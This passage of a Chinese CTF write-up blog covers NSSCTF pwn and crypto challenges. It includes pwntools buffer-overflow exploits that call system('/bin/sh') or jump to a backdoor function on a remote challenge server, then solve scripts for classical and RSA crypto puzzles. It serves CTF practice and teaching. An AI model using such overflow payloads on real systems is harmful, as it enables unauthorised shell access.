<span class="number">0x08048562</span></span><br><span class="line">bin_addr = <span class="number">0x0804A080</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;please tell me your name\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1c</span> + <span class="number">0x4</span>) + p32(system_addr) + p32(bin_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;now it&#x27;s your play time~\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ez-backdoor"><a href="#ez-backdoor" class="headerlink" title="ez_backdoor"></a>ez_backdoor</h3><p>主函数，可以看到vnln里面，read(0, buf, 0x140uLL);存在溢出。覆盖返回地址即可。</p><p><img src="https://s2.loli.net/2023/08/04/EsRMujK2F5nXlZP.png" alt="image-20221020145647559.png"></p><p>后门函数的地址在0x4011d2，溢出量为0x100。</p><p><img src="https://s2.loli.net/2023/08/04/dvQ9Meh5U4GtrzW.png" alt="image-20221020145810487.png"></p><p>exp.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;43.143.7.127&#x27;,28064)</span><br><span class="line">payload = b&#x27;a&#x27;*(0x100 + 0x8) + p64(0x4011d2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Week1-2"><a href="#Week1-2" class="headerlink" title="Week1"></a>Week1</h2><h3 id="baBAbaseSEse"><a href="#baBAbaseSEse" class="headerlink" title="baBAbaseSEse"></a>baBAbaseSEse</h3><p>base套娃，basecrcak一把梭。</p><p><img src="https://s2.loli.net/2023/08/04/biazNoIRK1LMvwp.png" alt="image-20221030103002488.png"></p><h3 id="A-dictator"><a href="#A-dictator" class="headerlink" title="A dictator"></a>A dictator</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">offset = randint(<span class="number">1</span>,<span class="number">100</span>) % <span class="number">26</span></span><br><span class="line"><span class="comment"># print(offset)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;NSSCTF&#123;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>([<span class="built_in">ord</span>(c) <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> flag[<span class="number">7</span>:-<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> flag[<span class="number">7</span>:-<span class="number">1</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= <span class="built_in">ord</span>(char) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        index = <span class="built_in">ord</span>(char)-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        new_char = <span class="built_in">chr</span>((index+offset)%<span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span>(new_char,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(char,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># lzw_uswksj_uahzwj_ak_gfw_gx_lzw_egkl_tskau_udskkausd_uahzwjk</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>经典凯撒，枚举即可。</p><h3 id="littleprince"><a href="#littleprince" class="headerlink" title="littleprince"></a>littleprince</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    <span class="keyword">return</span> a&gt;&gt;b|(a&amp;((<span class="number">1</span>&lt;&lt;b)-<span class="number">1</span>))&lt;&lt;(c-b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">outp</span>(<span class="params">x,h</span>):</span><br><span class="line">    p=randint(<span class="number">1</span>&lt;&lt;h,<span class="number">1</span>&lt;&lt;h+<span class="number">1</span>)</span><br><span class="line">    q=randint(<span class="number">1</span>&lt;&lt;h,<span class="number">1</span>&lt;&lt;h+<span class="number">1</span>)</span><br><span class="line">    c1,c2=x%p,x%q</span><br><span class="line">    <span class="built_in">print</span>(p,q,c1,c2)</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">m_len=m.bit_length()</span><br><span class="line">d,h,st=<span class="number">32</span>,<span class="number">16</span>,<span class="number">32</span></span><br><span class="line">r=m_len%d</span><br><span class="line"><span class="keyword">assert</span>(r&gt;h)</span><br><span class="line"><span class="keyword">while</span> st&lt;=m_len:</span><br><span class="line">    x=enc(m,st,m_len)</span><br><span class="line">    x&gt;&gt;=(m_len-d)</span><br><span class="line">    outp(x,h)</span><br><span class="line">    st+=d</span><br><span class="line">m&gt;&gt;=(m_len-r)</span><br><span class="line">outp(m,h)</span><br></pre></td></tr></table></figure><p>output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">58831 56263 46164 34042</span><br><span class="line">55579 48157 2944 35950</span><br><span class="line">35507 38933 1938 2559</span><br><span class="line">63419 51803 24116 33843</span><br><span class="line">40423 47237 20923 43307</span><br><span class="line">33599 43441 4324 37076</span><br><span class="line">43541 40771 42833 32799</span><br><span class="line">54869 40031 21847 16617</span><br><span class="line">48953 34841 36031 3788</span><br><span class="line">34403 58271 12464 55665</span><br><span class="line">33457 61463 3512 47396</span><br><span class="line">53047 57283 185 38171</span><br><span class="line">52583 59281 45851 38603</span><br><span class="line">60727 58043 36261 37164</span><br></pre></td></tr></table></figure><p>给了hint</p><p>hint:When we generate two numbers, there may be a coincidence that they are coprime.</p><p>求一下公约数,没有。中国剩余定理求一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">cipher, n</span>):</span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x, y: x * y, (i <span class="keyword">for</span> i <span class="keyword">in</span> n))</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    data = <span class="built_in">zip</span>(cipher, n)</span><br><span class="line">    <span class="keyword">for</span> ci, ni <span class="keyword">in</span> data:</span><br><span class="line">        Ni = N // ni</span><br><span class="line">        di = gmpy2.invert(Ni, ni)</span><br><span class="line">        result += ci * Ni * di</span><br><span class="line">    <span class="keyword">return</span> result % N, N</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()[::-<span class="number">1</span>]</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">flag_bin=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> data:</span><br><span class="line">    c_list = []</span><br><span class="line">    n_list = []</span><br><span class="line">    tmp = t.strip(<span class="string">&quot;\n&quot;</span>).split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    c_list.append(<span class="built_in">int</span>(tmp[<span class="number">2</span>]))</span><br><span class="line">    c_list.append(<span class="built_in">int</span>(tmp[<span class="number">3</span>]))</span><br><span class="line">    n_list.append(<span class="built_in">int</span>(tmp[<span class="number">0</span>]))</span><br><span class="line">    n_list.append(<span class="built_in">int</span>(tmp[<span class="number">1</span>]))</span><br><span class="line">    x, N = CRT(c_list, n_list)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">int</span>(x),long_to_bytes(<span class="built_in">int</span>(x)))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(x) &lt;<span class="number">618357700</span>:</span><br><span class="line">        flag += long_to_bytes(<span class="built_in">int</span>(x) + <span class="built_in">int</span>(tmp[<span class="number">0</span>])*<span class="built_in">int</span>(tmp[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += long_to_bytes(<span class="built_in">int</span>(x))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="XXXOOORRR"><a href="#XXXOOORRR" class="headerlink" title="XXXOOORRR"></a>XXXOOORRR</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">randBytes = [bytes_to_long(os.urandom(<span class="number">64</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;randBytes[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;randBytes[<span class="number">0</span>] ^ randBytes[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;randBytes[<span class="number">1</span>] ^ randBytes[<span class="number">2</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;d = <span class="subst">&#123;m ^ randBytes[<span class="number">0</span>] ^ randBytes[<span class="number">1</span>] ^ randBytes[<span class="number">2</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a = 1215421974111272707828609697064234072332368362928440865251897449605952163161176359366553487776268706107760670434157083936287598207881176904763353849369234</span></span><br><span class="line"><span class="string">b = 10533604054267448009117468094542127075826310122733511023911022436253583775790861879410728001403728088545946257902341417532648419689212361977221573357292618</span></span><br><span class="line"><span class="string">c = 6401236597601556248960570084212025183497657335932789785351897915858852832577623776212842429736547820800219382515052263929074210010546149322465536545021479</span></span><br><span class="line"><span class="string">d = 5711309307698496426409561761492698639489294806611133698231840146911562848869711567477706456972659368849642409039245400981517493100724067475248620536111560</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>一道异或题，d^c^a就是flag。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">a = <span class="number">1215421974111272707828609697064234072332368362928440865251897449605952163161176359366553487776268706107760670434157083936287598207881176904763353849369234</span></span><br><span class="line">b = <span class="number">10533604054267448009117468094542127075826310122733511023911022436253583775790861879410728001403728088545946257902341417532648419689212361977221573357292618</span></span><br><span class="line">c = <span class="number">6401236597601556248960570084212025183497657335932789785351897915858852832577623776212842429736547820800219382515052263929074210010546149322465536545021479</span></span><br><span class="line">d = <span class="number">5711309307698496426409561761492698639489294806611133698231840146911562848869711567477706456972659368849642409039245400981517493100724067475248620536111560</span></span><br><span class="line">m = d^c^a</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby_rsa"></a>baby_rsa</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(n,c)</span><br><span class="line"><span class="comment"># 62193160459999883112594854240161159254035770172137079047232757011759606702281</span></span><br><span class="line"><span class="comment"># 17331436837911040930486942133359735652484926528331507431552667656734821231501</span></span><br></pre></td></tr></table></figure><p>n可以直接用factor分解出p，q,然后一把梭就行。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">62193160459999883112594854240161159254035770172137079047232757011759606702281</span></span><br><span class="line">c = <span class="number">17331436837911040930486942133359735652484926528331507431552667656734821231501</span></span><br><span class="line">p=<span class="number">234560843346150602519484260867514743467</span></span><br><span class="line">q=<span class="number">265147241000574873803071047177766359643</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="爱妃"><a href="#爱妃" class="headerlink" title="爱妃"></a>爱妃</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">message,a,b,m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([(i*a+b)%m <span class="keyword">for</span> i <span class="keyword">in</span> message])</span><br><span class="line"></span><br><span class="line">a,b = getrandbits(<span class="number">4</span>),getrandbits(<span class="number">8</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;encrypt(flag,a,b,<span class="number">1</span>&lt;&lt;<span class="number">8</span>)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = b&#x27;y\xba\xba\xea\xc7\x11\xc2\xc7\xcb\xd8ZV\xd8ZVp\xb1\xb1\xd8\x19\xa4V\xa4\x19\x8aM\xa83g\xd8&amp;\x19\xdc&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>仿射加密.竟然已经知道明文的形式是NSSCTF{或者nssctf{，先爆破a,b，getrandbits(n)是获得一个在0-2^n之间的随机数，直接做字典爆破。a，b出来后爆破flag即可。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line">  </span><br><span class="line">ls1 = []</span><br><span class="line">ls2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">ls1.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">ls2.append(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;NSSCTF&#123;&quot;</span></span><br><span class="line">cipher = <span class="string">b&#x27;y\xba\xba\xea\xc7\x11\xc2\xc7\xcb\xd8ZV\xd8ZVp\xb1\xb1\xd8\x19\xa4V\xa4\x19\x8aM\xa83g\xd8&amp;\x19\xdc&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> ls1: <span class="comment">#爆破a和b</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> ls2:</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">            <span class="keyword">if</span> (a*flag[i] + b) % <span class="number">0x100</span> == cipher[i]:</span><br><span class="line">                s += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> s == <span class="number">7</span>:</span><br><span class="line">            <span class="built_in">print</span>(a,b)</span><br><span class="line">            <span class="comment">#13 131</span></span><br><span class="line">a,b = <span class="number">13</span>,<span class="number">131</span></span><br><span class="line">table = string.printable.encode() <span class="comment">#取ascii表</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table: <span class="comment">#爆破flag</span></span><br><span class="line">        <span class="keyword">if</span> (a*i + b)%<span class="number">0x100</span> == c:</span><br><span class="line">            res += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(res)   </span><br></pre></td></tr></table></figure><h2 id="Week2-1"><a href="#Week2-1" class="headerlink" title="Week2"></a>Week2</h2><h3 id="RSA-again"><a href="#RSA-again" class="headerlink" title="RSA again"></a>RSA again</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> x:x + <span class="built_in">bytes</span>([<span class="number">16</span> - <span class="built_in">len</span>(x)%<span class="number">16</span>] * (<span class="number">16</span> - <span class="built_in">len</span>(x)%<span class="number">16</span>))</span><br><span class="line">m = bytes_to_long(pad(flag))</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">r = getPrime(<span class="number">1024</span>)</span><br><span class="line">s = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">n1 = p*q</span><br><span class="line">n2 = r*s</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">0x3</span></span><br><span class="line">e2 = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m,e1,n1)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m,e2,n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n1 = <span class="subst">&#123;n1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n2 = <span class="subst">&#123;n2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e1 = <span class="subst">&#123;e1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e2 = <span class="subst">&#123;e2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1 = <span class="subst">&#123;c1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c2 = <span class="subst">&#123;c2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n1 = 19920284552214772740140135352548541831031690920425912140961436065508824546041514076016684238261995522677433833330399269923572993489681770913908642529489382472548548664350078176417366141695108301338793624641102311886122714705781923892243561473766978666116035403145672686443197319003393949350402512739343998236331447680561106899174404316265329944969786438022711742891334905159259854026408058542492105569778656883811323759583727586331462200020945101286801110840081277963013591342157754264111051785385892113635682519079401538045775697382691195557344630571694510115674941400112478156619785019370731073096018975390492287333</span></span><br><span class="line"><span class="string">n2 = 16329690193309629244191723145720681753145067517963214005637012320130767690248475184382159868590994476900972592910808281306311987027465355492106975220876976952805197358639881107619560544543352300924359258546945240852850094015390140482140815264345348655887196971643211396274684514779113163628885090661524523232327450873503097327714815509514869056066300689707819915660849896274673178482085029145101175879255721581466301617903290840675945809027289325795423671263820619585424051649443606301277124322653881307702397752575258862656767834175467463999624688529625582031941402015943516022965802189663157681884162493551612612033</span></span><br><span class="line"><span class="string">e1 = 3</span></span><br><span class="line"><span class="string">e2 = 65537</span></span><br><span class="line"><span class="string">c1 = 1752041777918702842605810950957832076618830231626916748933875881505173164404519153781007066742915517004902508987841695668088780745675304779496841107726530280651344357647334690721873124324358539328142005709830859468027528835981960873390785515876157664035579935532043154959183555353553164481674735512873428044452976229459806219115571797514157279125</span></span><br><span class="line"><span class="string">c2 = 13118485959563304540673377439664643422000629435115361166348221705991314239675693340024813013156594762061646798463551395329521013651893257141697813554253378348002502855822191264845788826850528723400519059095869424931054523865083127809240502348046515579012160733570975234405522250330692499687684922633627550243811524972452606330768418753137605045204137872122584136368073471612976975360656501198000053578279110813009137808852376287556012668702182416374333935081007133880603708035832346742292444210108820267460698390600228183548619401334969739679892562475501201965275739796687679445529050630235296740377171065357995433586</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>注意的是e1=3很小，低加密指数攻击。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">c, e, n</span>):</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mm = c + n*k</span><br><span class="line">        result, flag = gmpy2.iroot(mm, e)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">True</span> == flag:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">n= <span class="number">19920284552214772740140135352548541831031690920425912140961436065508824546041514076016684238261995522677433833330399269923572993489681770913908642529489382472548548664350078176417366141695108301338793624641102311886122714705781923892243561473766978666116035403145672686443197319003393949350402512739343998236331447680561106899174404316265329944969786438022711742891334905159259854026408058542492105569778656883811323759583727586331462200020945101286801110840081277963013591342157754264111051785385892113635682519079401538045775697382691195557344630571694510115674941400112478156619785019370731073096018975390492287333</span></span><br><span class="line">e= <span class="number">3</span></span><br><span class="line">c= <span class="number">1752041777918702842605810950957832076618830231626916748933875881505173164404519153781007066742915517004902508987841695668088780745675304779496841107726530280651344357647334690721873124324358539328142005709830859468027528835981960873390785515876157664035579935532043154959183555353553164481674735512873428044452976229459806219115571797514157279125</span></span><br><span class="line"></span><br><span class="line">m=de(c,e,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure><h3 id="strange-RSA"><a href="#strange-RSA" class="headerlink" title="strange RSA"></a>strange RSA</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 